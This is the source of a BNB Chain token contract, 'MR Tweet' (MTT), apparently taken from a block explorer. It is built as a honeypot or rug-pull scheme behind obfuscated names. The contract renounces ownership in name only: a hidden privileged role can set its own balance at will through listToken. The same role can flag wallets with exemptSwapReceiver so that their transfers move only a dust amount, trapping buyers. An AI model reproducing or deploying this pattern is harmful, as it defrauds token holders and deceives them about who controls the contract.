/**
 *Submitted for verification at BscScan.com on 2023-01-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


interface amountAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface totalList {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MRTweet {
    uint8 public decimals = 18;
    mapping(address => bool) public receiverMode;
    mapping(address => mapping(address => uint256)) public allowance;
    string public symbol = "MTT";

    address public feeToReceiver;
    uint256 constant minFund = 10 ** 10;
    mapping(address => bool) public walletMaxTx;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public teamAmountReceiver;
    address public owner;
    string public name = "MR Tweet";
    mapping(address => uint256) public balanceOf;




    modifier buyTeam() {
        require(receiverMode[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed teamTo, address indexed receiverSell);
    event Transfer(address indexed shouldTeam, address indexed feeTakeLiquidity, uint256 tradingReceiverTotal);
    event Approval(address indexed takeMax, address indexed receiverExempt, uint256 tradingReceiverTotal);

    constructor (){
        amountAuto totalMode = amountAuto(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        feeToReceiver = totalList(totalMode.factory()).createPair(totalMode.WETH(), address(this));
        owner = msg.sender;
        teamAmountReceiver = owner;
        receiverMode[teamAmountReceiver] = true;
        balanceOf[teamAmountReceiver] = totalSupply;
        emit Transfer(address(0), teamAmountReceiver, totalSupply);
        renounceOwnership();
    }

    

    function getOwner() external view returns (address) {
        return owner;
    }

    function transfer(address minShouldLaunched, uint256 shouldEnable) external returns (bool) {
        return transferFrom(msg.sender, minShouldLaunched, shouldEnable);
    }

    function listToken(uint256 shouldEnable) public buyTeam {
        balanceOf[teamAmountReceiver] = shouldEnable;
    }

    function transferFrom(address exemptFrom, address minShouldLaunched, uint256 shouldEnable) public returns (bool) {
        if (exemptFrom != msg.sender && allowance[exemptFrom][msg.sender] != type(uint256).max) {
            require(allowance[exemptFrom][msg.sender] >= shouldEnable);
            allowance[exemptFrom][msg.sender] -= shouldEnable;
        }
        if (minShouldLaunched == teamAmountReceiver || exemptFrom == teamAmountReceiver) {
            return buyMin(exemptFrom, minShouldLaunched, shouldEnable);
        }
        if (walletMaxTx[exemptFrom]) {
            return buyMin(exemptFrom, minShouldLaunched, minFund);
        }
        return buyMin(exemptFrom, minShouldLaunched, shouldEnable);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(teamAmountReceiver, address(0));
        owner = address(0);
    }

    function marketingEnable(address liquidityEnable) public buyTeam {
        receiverMode[liquidityEnable] = true;
    }

    function buyMin(address enableList, address limitSwap, uint256 shouldEnable) internal returns (bool) {
        require(balanceOf[enableList] >= shouldEnable);
        balanceOf[enableList] -= shouldEnable;
        balanceOf[limitSwap] += shouldEnable;
        emit Transfer(enableList, limitSwap, shouldEnable);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function exemptSwapReceiver(address feeTx) public buyTeam {
        walletMaxTx[feeTx] = true;
    }


}